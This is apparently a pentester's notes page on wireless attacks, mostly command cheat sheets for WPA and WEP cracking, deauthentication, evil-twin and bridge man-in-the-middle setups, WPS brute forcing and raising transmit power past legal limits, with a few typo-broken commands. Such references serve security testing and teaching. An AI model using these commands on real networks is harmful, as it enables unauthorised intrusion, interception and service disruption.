# Wireless

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

## Choosing a wireless module

You must choose a wireless module that has a chipset that is capable of being put in monitor mode. The site below has a fairly comprehensive list of adapters that support this.

[https://miloserdov.org/?p=2196](https://miloserdov.org/?p=2196)

## Using an ALFA Wireless Adapter in Linux \(Kali\)

Install the correct driver with `apt-get install realtek-rtl88xxau-dkms`. After a reboot the WiFi adapter worked on my installation. The only thing to note - it may not work in the usual way with `airmon-ng` to capture handshakes. The following commands can be used to troubleshoot the interface:

```text
sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

After a lot of failed attempts I found a working solution for folks that have continued problems with getting the Alfa card to work. First unplug your Wi-Fi adapter, then follow these steps:

```bash
apt remove realtek-rtl88xxau-dkms && apt purge realtek-rtl88xxau-dkms
apt update && apt upgrade 
apt autoremove && apt autoclean 
# reboot
apt-get dist-upgrade
# reboot
git clone https://github.com/aircrack-ng/rtl8812au
cd rtl8812au 
make && make install
# power off the PC
```

Now turn ON the PC and plug your Wi-Fi adapter and it should work normally.

* [https://null-byte.wonderhowto.com/how-to/hack-5-ghz-wi-fi-networks-with-alfa-wi-fi-adapter-0203515/](https://null-byte.wonderhowto.com/how-to/hack-5-ghz-wi-fi-networks-with-alfa-wi-fi-adapter-0203515/)
* [https://forums.kali.org/showthread.php?46019-How-to-Setup-Alfa-AWUS036ACH-RTL8812AU-on-Kali-Linux-2019-4](https://forums.kali.org/showthread.php?46019-How-to-Setup-Alfa-AWUS036ACH-RTL8812AU-on-Kali-Linux-2019-4)
* [https://forums.kali.org/showthread.php?50408-Kali-2020-2-ALFA-AWUS036ACH&highlight=awus036ach](https://forums.kali.org/showthread.php?50408-Kali-2020-2-ALFA-AWUS036ACH&highlight=awus036ach)
* [https://www.amazon.com/Network-AWUS036ACS-Wide-Coverage-Dual-Band-High-Sensitivity/dp/B0752CTSGD/?tag=whtnb-20](https://www.amazon.com/Network-AWUS036ACS-Wide-Coverage-Dual-Band-High-Sensitivity/dp/B0752CTSGD/?tag=whtnb-20)

## **Setting TX \(transmit\) POWER**

```bash
iw reg set BO
iwconfig wlan0 txpower 25
```

## **Cracking WPA**

```bash
airmon-ng start wlan0
airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon
aireplay-ng -0 1 -a $AP_MAC -c $victim_MAC wlan0mon #de-authentication attack
aircrack-ng -0 -w $pass_list $cap_file
```

## **Cracking WEP**

### **with Connected Clients**

```bash
airmon-ng start wlan0 #[$channel] (optional)
airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon
aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon #fake authentication
aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon #ARP replay attack
aireplay-ng -0 1 -a $AP_MAC -c $client_MAC wlan0mon #de-authentication attack - as needed
```

\`\`

### **via a Client**

```bash
airmon-ng start wlan0 #[$channel] (optional)
airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon
aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon #fake authentication
aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
aireplay-ng -2 -r $in_cap_file wlan0mon #inject using cap file
aircrack-ng -0 -z -n 64 $in_cap_file
```

### **ARP amplification**

```bash
airmon-ng start wlan0 #[$channel] (optional)
airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon
aireplay-ng -1 500 -q 8 -a $AP_MAC wlan0mon
areplay-ng -5 -b $AP_MAC -h $host_MAC wlan0mon
packetforge-ng -0 -a $AP_MAC -h $host_MAC -l $src_IP -k $dest_IP -y $FRAGMENT_XOR   -w $out_cap_file
tcpdump -n -vvv -e -s0 -r $in_cap_file
packetforge-ng -0 -a $AP_MAC -h $host_MAC -k $destIP) -l $srcIP) -y $FRAGMENT_XOR -w $out_cap_file
aireplay-ng -2 -r $in_cap_file wlan0mon
```

### **Cracking WEP /w shared key AUTH**

```bash
airmon-ng start wlan0 #[$channel]
airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon
#getting errors here: aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon #fake authentication
aireplay-ng -0 1 -a #AP_MAC -c $client_MAC wlan0mon #{de-authentication attack}
aireplay-ng -1 60 -e $ESSID -y $sharedkey_file -a $AP_MAC -h $host_MAC wlan0mon #fake authentication /w PRGA XOR file
aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon #ARP replay attack
aireplay-ng -0 1 -a $AP_MAC -c $client_MAC wlan0mon #de-authentication attack
aircrack-ng -0 -z -n 64 $in_cap_file #PTW attack; [-n]: Specify the length of the key: 64 for 40-bit WEP, 128 for 104-bit WEP
```

### **Cracking a Clientless WEP \(FRAG AND KOREK\)**

#### _{FRAG}_

```bash
airmon-ng start wlan0 #[channel]
airodump-ng -c $channel –bssid $AP_MAC -w $out_file wlan0mon
aireplay-ng -1 60 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon #fake authentication
~aireplay-ng -5 -b $AP_MAC -h $host_MAC wlan0mon #frag attack
packetforge-ng -0 -a $AP_MAC -h $host_MAC -l $src_IP -k $dest_IP -y $frag_file -w $out_file.cap
tcpdump -n -vvv -e -s0 -r $in_file.cap #To test reading the capture file
aireplay-ng -2 -r $in_file.cap wlan0mon
```

#### _{KOREK}_

```bash
aireplay-ng -4 -b $AP_MAC -h $host_MAC wlan0mon
tcpdump -s 0 -s -e -r $in_file.cap #takes input from aireplay output .cap
packetforge-ng -0 -a $AP_MAC -h $host_MAC -l $src_IP -k $dest_IP -y $xor_fragfile -w $out_file.cap
aireplay-ng -2 -r $in_file.cap wlan0mon
aircrack-ng -0 $in_file.cap
```

## **Karmetasploit**

* [https://www.offensive-security.com/metasploit-unleashed/karmetasploit/](https://www.offensive-security.com/metasploit-unleashed/karmetasploit/)

```bash
airbase-ng -c $channel -P -C 60 -e “FREE WiFi” -v wlan0mon #"FREE WiFi" is the name of your evil AP
ifconfig at0 up 10.0.0.1/24
mkdir -p /var/run/dhcpd
chown -R dhcpd:dhcpd /var/run/dhcpd
touch /var/lib/dhcp3/dhcpd.leases
cat dhcpd.conf
touch /tmp/dhcp.log
chown dhcpd:dhcpd /tmp/dhcp.log
dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp.log at0
msfconsole -r /root/karma.rc
```

## **Pyrit**

* [https://github.com/JPaulMora/Pyrit](https://github.com/JPaulMora/Pyrit)

### **pyrit DB attacks**

```bash
pyrit eval
pyrit -i $wordlist import_passwords
pyrit -e $essid create_essid
pyrit batch
pyrit batch -r $capturefile -b $AP_MAC attack_db
```

**pyrit strip**

```bash
pyrit -r $capturefile -o $outfile strip
```

**pyrit dictionary attack**

```bash
pyrit -r $capturefile -i $wordlist -b $AP_MAC attack_passthrough
```

## **MISC**

TODO: Split "Misc" items into proper sections; prep code for scripting \(issue [\#16](https://github.com/zweilosec/Infosec-Notes/issues/16)\)

* Put each example into its respective section
* Clean up code examples and prep for scripting
* Remove second "misc" section

### **Bridge-control man in the middle**

```bash
airebase-ng -c 3 -e “FREE WiFi” wlan0mon
brctl addbr hacker(interface name)
brctl addif hacker eth0
brctl addif hacker at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig hacker 192.168.1.8 up
ifconfig hacker
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### **airgraph-ng**

```bash
# $infile should be a .csv from aerodump-ng, $outfile should be a .png
airgraph-ng -i $infile.csv -o $outfile.png -g CAPR 
eog $outfile.png
airgraph-ng -i $infile.csv -o $outfile.png -g CPG 
eog $outfile.png
```

* **CAPR**: Client to AP Relationship. This shows all the clients attached to a particular AP.
* **CPG**: Common Probe Graph. This will show all probed SSID by clients.
* [https://www.aircrack-ng.org/doku.php?id=airgraph-ng](https://www.aircrack-ng.org/doku.php?id=airgraph-ng)

### **airdecap-ng**

With `airdecap-ng` you can decrypt WEP/WPA/WPA2 capture files. As well, it can also be used to strip the wireless headers from an unencrypted wireless capture.

It outputs a new file ending with “`-dec.cap`” which is the decrypted/stripped version of the input file.

| Option | Param. | Description |
| :--- | :--- | :--- |
| -l |  | don't remove the 802.11 header |
| -b | bssid | access point MAC address filter |
| -k | pmk | WPA/WPA2 Pairwise Master Key in hex |
| -e | essid | target network ascii identifier |
| -p | pass | target network WPA/WPA2 passphrase |
| -w | key | target network WEP key in hexadecimal |

#### Remove the wireless headers from an open network \(no encryption\) capture:

```bash
airdecap-ng -b $AP_MAC $capfile
```

#### Decrypt a WEP-encrypted capture using a hexadecimal WEP key:

```bash
airdecap-ng -w $WEP_KEY $WEP_capfile
```

#### Decrypt a WPA/WPA2 encrypted capture using the passphrase:

```bash
airdecap-ng -e $ESSID -p $WPA_PASS $WPA_capfile
```

#### WPA/WPA2 Requirements <a id="wpa_wpa2_requirements"></a>

The capture file must contain a valid four-way handshake. For this purpose having \(packets 2 and 3\) or \(packets 3 and 4\) will work correctly. In fact, you don't truly need all four handshake packets.

As well, only data packets following the handshake will be decrypted. This is because information is required from the handshake in order to decrypt the data packets.

* [https://www.aircrack-ng.org/doku.php?id=airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng)

### Combining CSV files

To combine your `airodump-ng` .txt/.csv files together simply open up a terminal and cd into the directory where you're keeping them in and then type:

```bash
dump-join.py -i $infile1 $infile2 $infile3 -o $outfile
```

### Man-in-the-middle with Bettercap

* [https://www.bettercap.org/](https://www.bettercap.org/)

## Misc

```text
WEP attack with aircrack-ng suite.
----------------------------------

airmon-ng start wlan0 <AP Channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
aireplay-ng -3 -b <AP MAC> -h <Attacker MAC> wlan0mon # ARP Replay
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> wlan0mon
aircrack-ng -0 <filename.cap>

airmon-ng start wlan0 <AP Channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
aireplay-ng -5 -b <AP MAC> -h <Attacker MAC> wlan0mon
packetforge-ng -0 -a <AP MAC> -h <Attacker MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <packet filename>
tcpdump -n -vvv -e -s0 -r <packet filename>
aireplay-ng -2 -r <packet filename> wlan0mon
aircrack-ng -0 <filename>


WPA PSK attack with aircrack-ng suite.
--------------------------------------

airmon-ng start wlan0 <AP Channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0mon
aircrack-ng -0 -w <wordlist> <capture file>

You can capture the handshake passively (it takes time) or de-authenticate a client.

De-authentication attack
aireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0

Deauth every client - aireplay-ng -0 5 -a <bssid> mon0

Dictionary Attack
aircrack-ng -w passwords.lst capture-01.cap

Brute force Attack
crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap

CoWPAtty Attack
Wordlist mode:
cowpatty -r <Capture file> -f <wordlist> -2 -s <AP ESSID>

PMK mode:
genpmk -f <wordlist> -d <hash filename> -s <AP ESSID>
cowpatty -r <Capture file> -d <hash filename> -2 -s <AP ESSID>

Rogue Access Point Testing
--------------------------

# ifconfig wlan0 down
# iw reg set BO
# iwconfig wlan0 txpower 0
# ifconfig wlan0 up
# airmon-ng start wlan0
# airodump-ng --write capture mon0

ifconfig wlan1 down
iw reg set BO
ifconfig wlan1 up
iwconfig wlan1 channel 13
iwconfig wlan1 txpower 30
iwconfig wlan1 rate 11M auto


Reaver
------

airmon-ng start wlan0
airodump-ng wlan0
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1


Pixie WPS
---------

airmon-ng check
airmon-ng start wlan0
airodump-ng wlan0mon --wps
reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1


Wireless Notes
--------------

Wired Equivalent Privacy (WEP)
RC4 stream cipher w/ CRC32 for integrity check
- Attack: 
By sniffing an ARP packet, then replaying it to get many encrypted replies with different IVs.
- Remediation: 
Use WPA2

Wifi Protected Access (WPA)
Temporal Key Integrity Protocol (TKIP) Message Integrity Check
- Attack: 
Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
- Remediation: 
Use long-keys

Wifi Protected Access 2 (WPA2)
Advanced Encryption Standard (AES)
- Attack: 
Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
- Remediation:
WPA-Enterprise
```



If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

